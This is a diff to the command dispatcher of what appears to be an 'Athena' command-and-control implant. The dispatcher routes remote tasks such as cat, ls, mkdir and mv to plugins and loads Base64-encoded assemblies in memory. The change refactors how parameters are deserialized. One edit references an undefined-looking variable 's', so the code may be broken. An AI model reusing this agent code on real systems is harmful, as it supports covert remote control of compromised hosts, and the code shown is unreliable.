@@ -23,9 +23,7 @@ namespace Athena.Commands
             switch (job.task.command)
             {
                 case "cat":
-                    var values = JsonConvert.DeserializeObject<Dictionary<string, string>>(json)
-                    job.taskresult = checkAndRunPlugin(JsonConvert.DeserializeObject <Dictionary<string, object>>(job.task.parameters));
-                    job.taskresult = checkAndRunPlugin(job.task.command, job.task.parameters);
+                    job.taskresult = checkAndRunPlugin(job.task.command,JsonConvert.DeserializeObject <Dictionary<string, object>>(job.task.parameters));
                     job.complete = true;
                     job.hasoutput = true;
                     if (string.IsNullOrEmpty(job.taskresult))
@@ -95,7 +93,7 @@ namespace Athena.Commands
                     job.hasoutput = true;
                     break;
                 case "ifconfig":
-                    job.taskresult = checkAndRunPlugin(job.task.command, job.task.parameters);
+                    job.taskresult = checkAndRunPlugin(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
                     job.complete = true;
                     job.hasoutput = true;
                     if (string.IsNullOrEmpty(job.taskresult))
@@ -172,7 +170,7 @@ namespace Athena.Commands
                     });
                     break;
                 case "ls":
-                    job.taskresult = checkAndRunPlugin(job.task.command, job.task.parameters);
+                    job.taskresult = checkAndRunPlugin(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
                     job.complete = true;
                     job.hasoutput = true;
                     if (string.IsNullOrEmpty(job.taskresult))
@@ -206,7 +204,7 @@ namespace Athena.Commands
                     job.taskresult = AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(loadcs.assembly), "test");
                     break;
                 case "mkdir":
-                    job.taskresult = checkAndRunPlugin(job.task.command, job.task.parameters);
+                    job.taskresult = checkAndRunPlugin(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
                     job.complete = true;
                     job.hasoutput = true;
                     if (string.IsNullOrEmpty(job.taskresult))
@@ -221,7 +219,7 @@ namespace Athena.Commands
                     }
                     break;
                 case "mv":
-                    job.taskresult = checkAndRunPlugin(job.task.command, job.task.parameters);
+                    job.taskresult = checkAndRunPlugin(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
                     job.complete = true;
                     job.hasoutput = true;
                     if (string.IsNullOrEmpty(job.taskresult))
@@ -278,7 +276,7 @@ namespace Athena.Commands
         {
             if (Globals.loadedcommands.ContainsKey(name))
             {
-                return AssemblyHandler.RunLoadedCommand(name, args);
+                return AssemblyHandler.RunLoadedCommand(name, s);
             }
             else
             {
